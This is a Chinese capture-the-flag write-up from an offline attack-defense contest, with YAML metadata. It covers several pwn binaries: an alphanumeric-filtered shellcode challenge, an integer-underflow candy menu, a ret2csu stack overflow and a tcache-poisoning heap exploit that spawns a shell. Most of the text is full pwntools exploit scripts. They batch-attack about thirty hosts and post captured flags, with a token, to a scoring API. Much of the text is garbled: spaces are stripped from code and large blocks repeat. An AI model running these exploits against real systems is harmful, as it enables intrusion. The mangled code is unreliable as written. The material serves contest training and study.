---
title: 2025 磐石行动 - 线下 AWD PWN
contest: 2025 磐石行动 (线下 AWD)
year: 2025
difficulty: hard
vuln_type:
- ret2libc
- heap_exploit
- pwn_unknown
tags:
- AWD
- 磐石行动
- shellcode
- cat-flag
- Halloween
- candy
- msg
- conn
- addConn-removeConn-editConn-listConn
- ret2csu
- seccomp
- system-then-ORW
- flag-submission-API
- multi-target
attack_chain:
- 'Q1 Halloween: 输入 shellcode 触发 Prank Time → push 0 + shellcraft.cat(''/flag/flag'')'
- 白名单字符过滤 (0-9, A-Z, a-z) → 纯 shellcode 不行，需 alphanumeric shellcode 或用过滤字符巧妙组合
- 'Q2 candy treat(): readint() 选 candy → ''How many?'' 输入 -6 → 整数下溢减计数器'
- 'Q3 msg/conn 系统: 4 选项 send/receive/history/ConnectionManager'
- send 触发 readn() malloc 0x500 → buf 0x128 后 ret2csu → leak printf → system
- 'Q4 connMngr: add/free/show/edit → tcache dup + chunk overlap + free_hook 改 system'
- flag 通过 POST /api/awd/batch_flag/ 提交拿 token+pk
- hosts 10.103.x.3-30 30 台机器多目标攻击
key_payload: payload = shellcraft.cat('/flag/flag') + push 0 (rsp 16 字节对齐)
one_liner: AWD 多目标攻击：4 题 30 机器脚本化攻击 + flag 自动提交
lesson: AWD 模式要脚本化批量打；seccomp 时 system 不可用要 ORW；整数下溢注意负数边界
quality: high
full_path: 2025_磐石行动-线下AWD-PWN.full.md
meta_path: 2025_磐石行动-线下AWD-PWN.meta.md
images_removed: true
images_removed_count: 9
schema_version: v3.0.0-P0
summary: '2025 磐石行动 - 线下 AWD PWN。AWD 多目标攻击：4 题 30 机器脚本化攻击 + flag 自动提交。关键路径：Q1 Halloween: 输入 shellcode 触发 Prank Time → push 0 + shellcraft.cat(''/flag/flag'') → 白名单字符过滤 (0-9, A-Z, a-z) → 纯 shellcode 不行，需 alphan...'
category: pwn
subcategory: stack_overflow
subcategories:
- stack_overflow
- heap_exploitation
- pwn_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 9
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/274233.html
reasoning_chain:
- '[触发点] 4 题 30 机器 AWD 模式 → 假设：脚本化批量打 → [动作] hosts = [''10.103.1.4'',''10.103.2.4'',...] → [观察] 30 个 IP → [下一步] for i in hosts[17:]: try'
- '[触发点] pwn1 Connection Manager + editConn 函数 read(0, ptr, nbytes) 无大小校验 → 假设：堆溢出 → [动作] add(0, 0x10, b''a''*0x10) + add(1, 0x10, b''a''*0x10) + free(1) + free(0) → [观察] tcache 准备 → [下一步] show leak'
- '[触发点] add(0, 0x500, b''a'') 后 show() → 假设：泄 libc 地址 → [动作] tmp = hex(t)[2:]; tmp = tmp[2:]+tmp[:2]; t = int(tmp, 16) - 0x1ecb43 → [观察] 拿到 libc_base → [下一步] fhook = 0x405018 + system'
- '[触发点] edit 0x10 字节覆盖 tcache fd 指针 → 假设：tcache poisoning 改 fhook → [动作] edit(6, p64(0)*5+p64(0x21)+p64(0)*3+p64(0x31)+p64(0)*2) → [观察] 改完 → [下一步] add(8, b''/bin/sh\x00''+p64(system))'
- '[触发点] free(8) → system(''/bin/sh'') → 假设：flag 在 /flag/flag → [动作] cat /flag/flag → [观察] flag → [下一步] requests.post(''/api/awd/batch_flag/'')'
- '[触发点] Halloween 题 push 0 + shellcraft.cat(''/flag/flag'') → 假设：直接打 → [动作] asm(payload) 拼 pwntools → [观察] flag 拿到 → [下一步] 批量提交'
- '[触发点] treat 题整数下溢 v0 = dword - readint() → 假设：负数绕过 → [动作] send ''-6'' 让 v0 越界 → [观察] bypass 限制'
- '[触发点] 4 题 30 机器 AWD 模式 → 假设：脚本化批量打 → [动作] hosts = [''10.103.1.4'',...] → [观察] 30 个 IP → [下一步] for i in hosts[17:]: try'
- '[触发点] pwn1 Connection Manager + editConn read 无大小校验 → 假设：堆溢出 → [动作] add(0, 0x10, b''a''*0x10) + free(1) → [观察] tcache 准备 → [下一步] show leak'
- '[触发点] edit 0x10 字节覆盖 tcache fd → 假设：tcache poisoning 改 fhook → [动作] edit(6, p64(0)*5+p64(0x21)+p64(0)*3+p64(0x31)) → [观察] 改完 → [下一步] add(8, b''/bin/sh\x00''+p64(system))'
- '[触发点] free(8) → system(''/bin/sh'') → 假设：flag 在 /flag/flag → [动作] cat /flag/flag → [观察] flag → [下一步] requests.post(''/api/awd/batch_flag/'')'
failed_attempts:
- 试图手工打 30 机器 → 失败：AWD 必须脚本化
- 试图覆盖 free.got → 失败：部分 RELRO 保护
- 试图用 seccomp 绕过 → 失败：必须用 ORW
key_observations:
- AWD 模式要脚本化批量打（for i in hosts[...]）
- seccomp 时 system 不可用要 ORW
- 整数下溢注意负数边界
- fhook = __free_hook = 0x405018 是经典覆盖目标
- AWD flag 提交 API：requests.post('/api/awd/batch_flag/')
prerequisites:
- AWD 批量攻击脚本（for + try/except + requests）
- tcache poisoning
- shellcraft.cat ORW 替代 system
- 整数下溢漏洞识别
---
# 2025 磐石行动-线下AWD-PWN

> 原文: https://www.ctfiot.com/274233.html
> ID: 274233

一、比赛模式简介

二、题目分析

buf =0LL; v20 =0LL; v21 =0LL; v22 =0LL; v23 =0LL; v24 =0LL; v25 =0LL; v26 =0LL; v27 =0LL; v28 =0LL; v29 =0LL; v30 =0LL; v31 =0LL; v32 =0LL; v33 =0LL; v34 =0LL; v35 =0LL; v36 =0LL; v37 =0LL; v38 =0LL; v39 =0LL; v40 =0LL; v41 =0LL; v42 =0LL; v43 =0LL; v44 =0LL; v45 =0LL; v46 =0LL; v47 =0LL; v48 =0LL; v49 =0LL; v50 =0LL;puts("Emmmmmm...... Prank Time!");read(0, &buf,0x100uLL);for( i =0; i <strlen((constchar*)&buf); ++i ) {if( (*((char*)&buf + i) <='/'|| *((char*)&buf + i) >'9') && (*((char*)&buf + i) <='@'|| *((char*)&buf + i) >'Z') && (*((char*)&buf + i) <='`'|| *((char*)&buf + i) >'z') ) {printf("nauty!%cn", (unsignedint)*((char*)&buf + i));return__readfsqword(0x28u) ^ v51; } } secret = Secret; v1 = v20; *(_QWORD *)Secret = buf; *((_QWORD *)secret +1) = v1; v2 = v22; *((_QWORD *)secret +2) = v21; *((_QWORD *)secret +3) = v2; v3 = v24; *((_QWORD *)secret +4) = v23; *((_QWORD *)secret +5) = v3; v4 = v26; *((_QWORD *)secret +6) = v25; *((_QWORD *)secret +7) = v4; v5 = v28; *((_QWORD *)secret +8) = v27; *((_QWORD *)secret +9) = v5; v6 = v30; *((_QWORD *)secret +10) = v29; *((_QWORD *)secret +11) = v6; v7 = v32; *((_QWORD *)secret +12) = v31; *((_QWORD *)secret +13) = v7; v8 = v34; *((_QWORD *)secret +14) = v33; *((_QWORD *)secret +15) = v8; v9 = v36; *((_QWORD *)secret +16) = v35; *((_QWORD *)secret +17) = v9; v10 = v38; *((_QWORD *)secret +18) = v37; *((_QWORD *)secret +19) = v10; v11 = v40; *((_QWORD *)secret +20) = v39; *((_QWORD *)secret +21) = v11; v12 = v42; *((_QWORD *)secret +22) = v41; *((_QWORD *)secret +23) = v12; v13 = v44; *((_QWORD *)secret +24) = v43; *((_QWORD *)secret +25) = v13; v14 = v46; *((_QWORD *)secret +26) = v45; *((_QWORD *)secret +27) = v14; v15 = v48; *((_QWORD *)secret +28) = v47; *((_QWORD *)secret +29) = v15; v16 = v50; *((_QWORD *)secret +30) = v49; *((_QWORD *)secret +31) = v16;Secret();

frompwnimport*fromae64importAE64importrequests#io=process('./pwn')hosts=['10.103.1.3','10.103.2.3','10.103.3.3','10.103.4.3','10.103.5.3','10.103.6.3','10.103.7.3','10.103.8.3','10.103.9.3','10.103.10.3','10.103.11.3','10.103.12.3','10.103.13.3','10.103.14.3','10.103.15.3','10.103.16.3','10.103.17.3','10.103.18.3','10.103.19.3','10.103.20.3','10.103.21.3','10.103.22.3','10.103.23.3','10.103.25.3','10.103.26.3','10.103.27.3','10.103.28.3','10.103.29.3','10.103.30.3']foriinhosts:
try: io=remote(f"{i}",9999)#io=remote('10.103.24.3',9999) libc=ELF('./libc.so.6') context.arch='amd64'defbug(): gdb.attach(io)deft1(sc): io.sendlineafter(b"Halloween is coming, momo wants candy.......",b"1") io.sendafter(b"Emmmmmm...... Prank Time!",sc) payload=asm("push 0"+shellcraft.cat("/flag/flag")) t1(payload) t=io.recvuntil(b"flag",timeout=3) flag=io.recvuntil(b"}",timeout=3) flag=flag.decode() flag=f"flag{flag}" url =b"https://10.10.26.6/api/awd/batch_flag/" headers = {"Content-Type":"application/json"} data ={"token":"87caca98ffb1d59926e65b7fbdc61462","flag":
flag,"pk":"166f8e1b83cd20e2cc1a813383e9d1b6"} res = requests.post(url=url,headers=headers,json=data,verify=False)#通过报文提交flagprint(f"nnn----------{i}-{res.text}-{flag}nnnn")exceptExceptionase:
print(f"nnn----------{i}-{e}nnnn") io.close()

_DWORD *treat(){intv0;// ecx _DWORD *result;// raxintv2;// [rsp+8h] [rbp-8h] v2 =readint();puts("Which kind of candy do you want to give to momo?");printf("%s?", &candyList[24* v2]); // "chewing gum"printf("How many?"); v0 = dword_40B0[6* v2] -readint(); result = dword_40B0; dword_40B0[6* v2] = v0;returnresult;}

from pwn import *io=process('./pwn')libc=ELF('./libc.so.6')io.sendlineafter(b"Halloween is coming, momo wants candy.......",b"1")io.sendafter(b"Emmmmmm...... Prank Time!",b"x01")io.sendline(b"2")io.sendline(b"-6")gdb.attach(io)print(hex(libc.sym.system+0x7ffff7dd5000))#num=libc.sym.strlen-libc.sym.systemio.sendlineafter(b"How many?",str(0x136670).encode())io.sendline(b"1")io.sendline(b"/bin/shx00")io.interactive()

A = sys_numberA >=0x40000000? dead :
nextA == execve ? dead :
nextA ==open? dead :
nextA == openat ? dead :
nextA == execveat ? dead :
nextA == mmap ? dead :
nextA == fstat ? dead :
nextreturnALLOWdead:
returnKILL

zer00ne@zer00ne-virtual-machine:~/Desktop/AWD/1$ checksec pwn[*]'/home/zer00ne/Desktop/AWD/1/pwn'Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x3fe000)SHSTK: EnabledIBT: EnabledStripped: No

void__fastcall __noreturnreal_main(constchar*Failed_to_send_message,constvoid*buf){size_tn;// rdxintflags;// ecxwhile(1) {menu(); // int menu()// {// puts("1. Send Message");// puts("2. Receive Message");// puts("3. Msg History");// puts("4. Connection Manager");// puts("5. Exit");// return printf("Please select an option: ");// }switch( (unsignedint)readint(Failed_to_send_message, buf) ) {case1u:if( (unsignedint)send((int)Failed_to_send_message, buf, n, flags) ==-1) { Failed_to_send_message ="Failed to send message";puts("Failed to send message"); }break;case2u:
receive();break;case3u:
get_history();break;case4u:
connMngr();break;case5u:
safe_exit();default: Failed_to_send_message ="Invalid option. Please try again.";puts("Invalid option. Please try again.");break; } }}

ssize_tsend(intfd,constvoid*buf,size_tn,intflags){ __int64 v5;// rbx __int64 v6;// rbxvoid*s;// [rsp+0h] [rbp-20h]inti;// [rsp+Ch] [rbp-14h] s =malloc(0x28uLL);if( s ) {memset(s,0,0x28uLL); *(_QWORD *)s =malloc(0x10uLL);if( *(_QWORD *)s ) { *(_DWORD *)(*(_QWORD *)s +8LL) =0x7F000001; *(_WORD *)(*(_QWORD *)s +12LL) =8080; **(_QWORD **)s = &unk_403230;puts("Enter destination IP address:"); *((_QWORD *)s +1) =malloc(0x10uLL);if( *((_QWORD *)s +1) ) { v5 = *((_QWORD *)s +1); *(_DWORD *)(v5 +8) =inet_addr((constchar*)0x10);if( *(_DWORD *)(*((_QWORD *)s +1) +8LL) ==-1) {puts("Invalid destination IP address. Exiting send operation.");free(s);return0xFFFFFFFFLL; }else {printf("Enter destination port (default is 8080): "); v6 = *((_QWORD *)s +1); *(_WORD *)(v6 +12) =htons((uint16_t)"Enter destination port (default is 8080): "); **((_QWORD **)s +1) = &unk_403230;printf("Msg: "); *((_QWORD *)s +3) =readn(); // void *readn()// {// size_t nbytes; // rax// void *ptr; // [rsp+8h] [rbp-8h]//// ptr = malloc(0x500uLL);// if ( ptr )// {// nbytes = malloc_usable_size(ptr);// if ( read(0, ptr, nbytes) > 0 )// {// return ptr;// }// else// {// free(ptr);// return 0LL;// }// }// else// {// perror("Failed to allocate memory for input buffer");// return 0LL;// }// }if( *((_QWORD *)s +3) ) { *((_DWORD *)s +4) =strlen(*((constchar**)s +3));if( *((_DWORD *)s +4) ) { *((_DWORD *)s +8) =0;for( i =0; i <=15; ++i ) {if( !msgHistory[i] ) { msgHistory[i] = s;puts("Message stored!");return0LL; } }free(*(void**)s);free(*((void**)s +1));free(*((void**)s +3));free(s);return0xFFFFFFFFLL; }else {puts("Message cannot be empty. Exiting send operation.");free(*((void**)s +3));free(s);return0xFFFFFFFFLL; } }else {puts("Failed to read message. Exiting send operation.");free(s);return0xFFFFFFFFLL; } } }else {perror("Failed to allocate memory for destination connection");free(*(void**)s);free(s);return0xFFFFFFFFLL; } }else {perror("Failed to allocate memory for source connection");free(s);return0xFFFFFFFFLL; } }else {perror("Failed to allocate memory for MsgHandler");return0xFFFFFFFFLL; }}

int__fastcallreceive(__int64 a1, __int64 a2){size_tn;// raxchardest[256];// [rsp+0h] [rbp-120h] BYREFchars[16];// [rsp+100h] [rbp-20h] BYREFvoid**v6;// [rsp+110h] [rbp-10h]unsignedintn0x10;// [rsp+11Ch] [rbp-4h]printf("Receive from?"); n0x10 =readint("Receive from?", a2);if( !n0x10 || n0x10 >0x10)returnprintf("Invalid message number. Please enter a number between 1 and %d.n",16); v6 = (void**)msgHistory[n0x10 -1];if( !v6 )returnprintf("No message found at index %d.n", n0x10 -1);ntoa(*((_DWORD *)*v6 +2), s,0x10uLL);printf("Received message from %s:%u", s, *((unsigned__int16 *)*v6 +6)); n =malloc_usable_size(v6[3]);memcpy(dest, v6[3], n);returnprintf("Message: %sn", dest);}

from pwn import *io=process('./pwn')libc=ELF('./libc.so.6')context.log_level='debug'csu1=0x4025DAmagic=0x40133D-1offset=0xe3b04-libc.sym.printfpayload=b'a'*0x128+p64(csu1)+p64(offset)+p64(0x405040+0x3d)+p64(0)*4+p64(magic)+p64(csu1)+p64(0)*5+p64(0x405040)+p64(0x4025C0)io.sendlineafter(b"Please select an option: ",b"1")io.sendlineafter(b"Enter IP address (format: a.b.c.d): ",b"0.0.0.0")io.sendlineafter(b"Enter destination port (default is 8080): ",b"8080")io.sendlineafter(b"Msg: ",payload)io.sendlineafter(b"Please select an option: ",b"2")#gdb.attach(io)io.sendlineafter(b"Receive from?",b"1")io.interactive()

__int64 __fastcallconnMngr(constchar*Invalid_option._Please_try_again., __int64 a2){ __int64 result;// raxwhile(1) {connMngrMenu(); result = (unsignedint)readint(Invalid_option._Please_try_again., a2);switch( (int)result ) {case1:
addConn(); //addbreak;case2:
removeConn(); //deletbreak;case3:
editConn(); //editbreak;case4:
listConn(); //showbreak;case5:
returnresult;default: Invalid_option._Please_try_again. ="Invalid option. Please try again.";puts("Invalid option. Please try again.");break; } }}

voidremoveConn(){intn0x10;// [rsp+Ch] [rbp-4h]puts("Connection Number?"); n0x10 =readint();if( (unsignedint)n0x10 <0x10) {if( *((_QWORD *)&connections + n0x10) ) {free(**((void***)&connections + n0x10));free(*((void**)&connections + (unsignedint)n0x10)); }else {puts("No connection exists at this index."); } }else {puts("Invalid connection number. Please enter a valid number."); }}

voideditConn(){ __int64 v0;// rbx __int64 v1;// rbxintnbytes;// [rsp+4h] [rbp-1Ch]intn0x10;// [rsp+Ch] [rbp-14h]puts("Connection Number?"); n0x10 =readint();if( (unsignedint)n0x10 <0x10) {if( *((_QWORD *)&connections + n0x10) ) {printf("New IP?");if(readint() ==1) { v0 = *((_QWORD *)&connections + n0x10); *(_DWORD *)(v0 +8) =inet_addr("New IP?"); }printf("New Port?");if(readint() ==1) { v1 = *((_QWORD *)&connections + n0x10); *(_WORD *)(v1 +12) =htons((uint16_t)"New Port?"); }printf("New Comment?");if(readint() ==1&& **((_QWORD **)&connections + n0x10) ) {printf("New Length?"); nbytes =readint();printf("New Content?");if(read(0, **((void***)&connections + n0x10), nbytes) <=0)perror("read error"); } }else {puts("No connection exists at this index."); } }else {puts("Invalid connection number. Please enter a valid number."); }}

frompwnimport*importrequests#io=process('./pwn')hosts=['10.103.1.4','10.103.2.4','10.103.3.4','10.103.4.4','10.103.5.4','10.103.6.4','10.103.7.4','10.103.8.4','10.103.9.4','10.103.10.4','10.103.11.4','10.103.12.4','10.103.13.4','10.103.14.4','10.103.15.4','10.103.16.4','10.103.17.4','10.103.18.4','10.103.19.4','10.103.20.4','10.103.21.4','10.103.22.4','10.103.23.4','10.103.25.4','10.103.26.4','10.103.27.4','10.103.28.4','10.103.29.4','10.103.30.4']#for i in hosts[:3]+hosts[4:15]+hosts[17:19]+hosts[21:28]:
foriinhosts[17:]:
try: io=remote(f"{i}",9999) libc=ELF('./libc.so.6') io.sendlineafter(b"Please select an option: ",b"4")
# context.log_level='debug'defbug(): gdb.attach(io)defch(Id): io.sendlineafter(b"Please select an option: ",str(Id).encode())defadd(Id,size,payload): ch(1) io.sendlineafter(b"Connection Number?",str(Id).encode()) io.sendlineafter(b"Enter IP address (format: a.b.c.d): ",b"10.101.10.10") io.sendlineafter(b"Enter port number (default is 8080): ",b"800") io.sendlineafter(b"Add comment?",b"1") io.sendlineafter(b"Length?",str(size).encode()) io.sendafter(b"Content?",payload)deffree(Id): ch(2) io.sendlineafter(b"Connection Number?",str(Id).encode())defshow(): ch(4)defedit(Id,payload): ch(3) io.sendlineafter(b"Connection Number?",str(Id).encode()) io.sendafter(b"New IP?",b"0n") io.sendlineafter(b"New Port?",b"0") io.sendlineafter(b"New Comment?",b"1") io.sendlineafter(b"New Length?",str(len(payload)).encode()) io.sendafter(b"New Content?",payload) add(0,0x10,b'a'*0x10) add(1,0x10,b'a'*0x10) free(1) free(0) add(0,0x500,b'a'*0x10) add(1,0x20,b'a') add(2,0x500,b'a'*0x10) add(3,0x200,b'a'*0x50) free(0) free(2) add(0,0x500,b'0')#bug() show() io.recvuntil(b"Comment: 0") t=u64(io.recv(6).ljust(8,b'x00'))print(hex(t)) tmp =hex(t)[2:] tmp = tmp[2:]+tmp[:2] t =int(tmp,16)-0x1ecb43print(hex(t)) fhook=0x405018 system=t+libc.sym.system add(4,0x40,b'a') add(5,0x40,b'a') edit(5,b'0'*0x10) add(6,0x20,b'a'*8) add(7,0x20,b'b'*8) free(7) edit(6,p64(0)*5+p64(0x21)+p64(0)*3+p64(0x31)+p64(0)*2) free(7) edit(6,p64(0)*5+p64(0x21)+p64(fhook-8)*2) add(8,0x10,b"/bin/shx00"+p64(system)) free(8) io.sendline(b"cat /flag/flag") t=io.recvuntil(b"flag") flag=io.recvuntil(b"}") flag=b"flag"+flag flag=flag.decode() url =b"https://10.10.26.6/api/awd/batch_flag/" headers = {"Content-Type":"application/json"} data = {"token":"87caca98ffb1d59926e65b7fbdc61462","flag":
flag,"pk":"166f8e1b83cd20e2cc1a813383e9d1b6"} res = requests.post(url=url,headers=headers,json=data,verify=False)print(f"nnn----------{i}-{res.text}-{flag}nnnn")exceptExceptionase:
print(f"nnn----------{i}-{e}nnnn") io.close()

看雪ID：zer00ne

https://bbs.kanxue.com/user-home-1024538.htm

*本文为看雪论坛优秀文章，由zer00ne原创，转载请注明来自看雪社区

看雪·第九届安全开发者峰会（SDC 2025）

# 往期推荐

无”痕”加载驱动模块之傀儡驱动 (上)

为 CobaltStrike 增加 SMTP Beacon

隐蔽通讯常见种类介绍

buuctf-re之CTF分析

物理读写/无附加读写实验

球分享

球点赞

球在看

点击阅读原文查看更多


```
buf =0LL; v20 =0LL; v21 =0LL; v22 =0LL; v23 =0LL; v24 =0LL; v25 =0LL; v26 =0LL; v27 =0LL; v28 =0LL; v29 =0LL; v30 =0LL; v31 =0LL; v32 =0LL; v33 =0LL; v34 =0LL; v35 =0LL; v36 =0LL; v37 =0LL; v38 =0LL; v39 =0LL; v40 =0LL; v41 =0LL; v42 =0LL; v43 =0LL; v44 =0LL; v45 =0LL; v46 =0LL; v47 =0LL; v48 =0LL; v49 =0LL; v50 =0LL;puts("Emmmmmm...... Prank Time!");read(0, &buf,0x100uLL);for( i =0; i <strlen((constchar*)&buf); ++i ) {if( (*((char*)&buf + i) <='/'|| *((char*)&buf + i) >'9') && (*((char*)&buf + i) <='@'|| *((char*)&buf + i) >'Z') && (*((char*)&buf + i) <='`'|| *((char*)&buf + i) >'z') ) {printf("nauty!%cn", (unsignedint)*((char*)&buf + i));return__readfsqword(0x28u) ^ v51; } } secret = Secret; v1 = v20; *(_QWORD *)Secret = buf; *((_QWORD *)secret +1) = v1; v2 = v22; *((_QWORD *)secret +2) = v21; *((_QWORD *)secret +3) = v2; v3 = v24; *((_QWORD *)secret +4) = v23; *((_QWORD *)secret +5) = v3; v4 = v26; *((_QWORD *)secret +6) = v25; *((_QWORD *)secret +7) = v4; v5 = v28; *((_QWORD *)secret +8) = v27; *((_QWORD *)secret +9) = v5; v6 = v30; *((_QWORD *)secret +10) = v29; *((_QWORD *)secret +11) = v6; v7 = v32; *((_QWORD *)secret +12) = v31; *((_QWORD *)secret +13) = v7; v8 = v34; *((_QWORD *)secret +14) = v33; *((_QWORD *)secret +15) = v8; v9 = v36; *((_QWORD *)secret +16) = v35; *((_QWORD *)secret +17) = v9; v10 = v38; *((_QWORD *)secret +18) = v37; *((_QWORD *)secret +19) = v10; v11 = v40; *((_QWORD *)secret +20) = v39; *((_QWORD *)secret +21) = v11; v12 = v42; *((_QWORD *)secret +22) = v41; *((_QWORD *)secret +23) = v12; v13 = v44; *((_QWORD *)secret +24) = v43; *((_QWORD *)secret +25) = v13; v14 = v46; *((_QWORD *)secret +26) = v45; *((_QWORD *)secret +27) = v14; v15 = v48; *((_QWORD *)secret +28) = v47; *((_QWORD *)secret +29) = v15; v16 = v50; *((_QWORD *)secret +30) = v49; *((_QWORD *)secret +31) = v16;Secret();
frompwnimport*fromae64importAE64importrequests#io=process('./pwn')hosts=['10.103.1.3','10.103.2.3','10.103.3.3','10.103.4.3','10.103.5.3','10.103.6.3','10.103.7.3','10.103.8.3','10.103.9.3','10.103.10.3','10.103.11.3','10.103.12.3','10.103.13.3','10.103.14.3','10.103.15.3','10.103.16.3','10.103.17.3','10.103.18.3','10.103.19.3','10.103.20.3','10.103.21.3','10.103.22.3','10.103.23.3','10.103.25.3','10.103.26.3','10.103.27.3','10.103.28.3','10.103.29.3','10.103.30.3']foriinhosts:
try: io=remote(f"{i}",9999)#io=remote('10.103.24.3',9999) libc=ELF('./libc.so.6') context.arch='amd64'defbug(): gdb.attach(io)deft1(sc): io.sendlineafter(b"Halloween is coming, momo wants candy.......",b"1") io.sendafter(b"Emmmmmm...... Prank Time!",sc) payload=asm("push 0"+shellcraft.cat("/flag/flag")) t1(payload) t=io.recvuntil(b"flag",timeout=3) flag=io.recvuntil(b"}",timeout=3) flag=flag.decode() flag=f"flag{flag}" url =b"https://10.10.26.6/api/awd/batch_flag/" headers = {"Content-Type":"application/json"} data ={"token":"87caca98ffb1d59926e65b7fbdc61462","flag":
flag,"pk":"166f8e1b83cd20e2cc1a813383e9d1b6"} res = requests.post(url=url,headers=headers,json=data,verify=False)#通过报文提交flagprint(f"nnn----------{i}-{res.text}-{flag}nnnn")exceptExceptionase:
print(f"nnn----------{i}-{e}nnnn") io.close()
_DWORD *treat(){intv0;// ecx _DWORD *result;// raxintv2;// [rsp+8h] [rbp-8h] v2 =readint();puts("Which kind of candy do you want to give to momo?");printf("%s?", &candyList[24* v2]); // "chewing gum"printf("How many?"); v0 = dword_40B0[6* v2] -readint(); result = dword_40B0; dword_40B0[6* v2] = v0;returnresult;}
from pwn import *io=process('./pwn')libc=ELF('./libc.so.6')io.sendlineafter(b"Halloween is coming, momo wants candy.......",b"1")io.sendafter(b"Emmmmmm...... Prank Time!",b"x01")io.sendline(b"2")io.sendline(b"-6")gdb.attach(io)print(hex(libc.sym.system+0x7ffff7dd5000))#num=libc.sym.strlen-libc.sym.systemio.sendlineafter(b"How many?",str(0x136670).encode())io.sendline(b"1")io.sendline(b"/bin/shx00")io.interactive()
A = sys_numberA >=0x40000000? dead :
nextA == execve ? dead :
nextA ==open? dead :
nextA == openat ? dead :
nextA == execveat ? dead :
nextA == mmap ? dead :
nextA == fstat ? dead :
nextreturnALLOWdead:
returnKILL
zer00ne@zer00ne-virtual-machine:~/Desktop/AWD/1$ checksec pwn[*]'/home/zer00ne/Desktop/AWD/1/pwn'Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x3fe000)SHSTK: EnabledIBT: EnabledStripped: No
void__fastcall __noreturnreal_main(constchar*Failed_to_send_message,constvoid*buf){size_tn;// rdxintflags;// ecxwhile(1) {menu(); // int menu()// {// puts("1. Send Message");// puts("2. Receive Message");// puts("3. Msg History");// puts("4. Connection Manager");// puts("5. Exit");// return printf("Please select an option: ");// }switch( (unsignedint)readint(Failed_to_send_message, buf) ) {case1u:if( (unsignedint)send((int)Failed_to_send_message, buf, n, flags) ==-1) { Failed_to_send_message ="Failed to send message";puts("Failed to send message"); }break;case2u:
receive();break;case3u:
get_history();break;case4u:
connMngr();break;case5u:
safe_exit();default: Failed_to_send_message ="Invalid option. Please try again.";puts("Invalid option. Please try again.");break; } }}
ssize_tsend(intfd,constvoid*buf,size_tn,intflags){ __int64 v5;// rbx __int64 v6;// rbxvoid*s;// [rsp+0h] [rbp-20h]inti;// [rsp+Ch] [rbp-14h] s =malloc(0x28uLL);if( s ) {memset(s,0,0x28uLL); *(_QWORD *)s =malloc(0x10uLL);if( *(_QWORD *)s ) { *(_DWORD *)(*(_QWORD *)s +8LL) =0x7F000001; *(_WORD *)(*(_QWORD *)s +12LL) =8080; **(_QWORD **)s = &unk_403230;puts("Enter destination IP address:"); *((_QWORD *)s +1) =malloc(0x10uLL);if( *((_QWORD *)s +1) ) { v5 = *((_QWORD *)s +1); *(_DWORD *)(v5 +8) =inet_addr((constchar*)0x10);if( *(_DWORD *)(*((_QWORD *)s +1) +8LL) ==-1) {puts("Invalid destination IP address. Exiting send operation.");free(s);return0xFFFFFFFFLL; }else {printf("Enter destination port (default is 8080): "); v6 = *((_QWORD *)s +1); *(_WORD *)(v6 +12) =htons((uint16_t)"Enter destination port (default is 8080): "); **((_QWORD **)s +1) = &unk_403230;printf("Msg: "); *((_QWORD *)s +3) =readn(); // void *readn()// {// size_t nbytes; // rax// void *ptr; // [rsp+8h] [rbp-8h]//// ptr = malloc(0x500uLL);// if ( ptr )// {// nbytes = malloc_usable_size(ptr);// if ( read(0, ptr, nbytes) > 0 )// {// return ptr;// }// else// {// free(ptr);// return 0LL;// }// }// else// {// perror("Failed to allocate memory for input buffer");// return 0LL;// }// }if( *((_QWORD *)s +3) ) { *((_DWORD *)s +4) =strlen(*((constchar**)s +3));if( *((_DWORD *)s +4) ) { *((_DWORD *)s +8) =0;for( i =0; i <=15; ++i ) {if( !msgHistory[i] ) { msgHistory[i] = s;puts("Message stored!");return0LL; } }free(*(void**)s);free(*((void**)s +1));free(*((void**)s +3));free(s);return0xFFFFFFFFLL; }else {puts("Message cannot be empty. Exiting send operation.");free(*((void**)s +3));free(s);return0xFFFFFFFFLL; } }else {puts("Failed to read message. Exiting send operation.");free(s);return0xFFFFFFFFLL; } } }else {perror("Failed to allocate memory for destination connection");free(*(void**)s);free(s);return0xFFFFFFFFLL; } }else {perror("Failed to allocate memory for source connection");free(s);return0xFFFFFFFFLL; } }else {perror("Failed to allocate memory for MsgHandler");return0xFFFFFFFFLL; }}
int__fastcallreceive(__int64 a1, __int64 a2){size_tn;// raxchardest[256];// [rsp+0h] [rbp-120h] BYREFchars[16];// [rsp+100h] [rbp-20h] BYREFvoid**v6;// [rsp+110h] [rbp-10h]unsignedintn0x10;// [rsp+11Ch] [rbp-4h]printf("Receive from?"); n0x10 =readint("Receive from?", a2);if( !n0x10 || n0x10 >0x10)returnprintf("Invalid message number. Please enter a number between 1 and %d.n",16); v6 = (void**)msgHistory[n0x10 -1];if( !v6 )returnprintf("No message found at index %d.n", n0x10 -1);ntoa(*((_DWORD *)*v6 +2), s,0x10uLL);printf("Received message from %s:%u", s, *((unsigned__int16 *)*v6 +6)); n =malloc_usable_size(v6[3]);memcpy(dest, v6[3], n);returnprintf("Message: %sn", dest);}
from pwn import *io=process('./pwn')libc=ELF('./libc.so.6')context.log_level='debug'csu1=0x4025DAmagic=0x40133D-1offset=0xe3b04-libc.sym.printfpayload=b'a'*0x128+p64(csu1)+p64(offset)+p64(0x405040+0x3d)+p64(0)*4+p64(magic)+p64(csu1)+p64(0)*5+p64(0x405040)+p64(0x4025C0)io.sendlineafter(b"Please select an option: ",b"1")io.sendlineafter(b"Enter IP address (format: a.b.c.d): ",b"0.0.0.0")io.sendlineafter(b"Enter destination port (default is 8080): ",b"8080")io.sendlineafter(b"Msg: ",payload)io.sendlineafter(b"Please select an option: ",b"2")#gdb.attach(io)io.sendlineafter(b"Receive from?",b"1")io.interactive()
__int64 __fastcallconnMngr(constchar*Invalid_option._Please_try_again., __int64 a2){ __int64 result;// raxwhile(1) {connMngrMenu(); result = (unsignedint)readint(Invalid_option._Please_try_again., a2);switch( (int)result ) {case1:
addConn(); //addbreak;case2:
removeConn(); //deletbreak;case3:
editConn(); //editbreak;case4:
listConn(); //showbreak;case5:
returnresult;default: Invalid_option._Please_try_again. ="Invalid option. Please try again.";puts("Invalid option. Please try again.");break; } }}
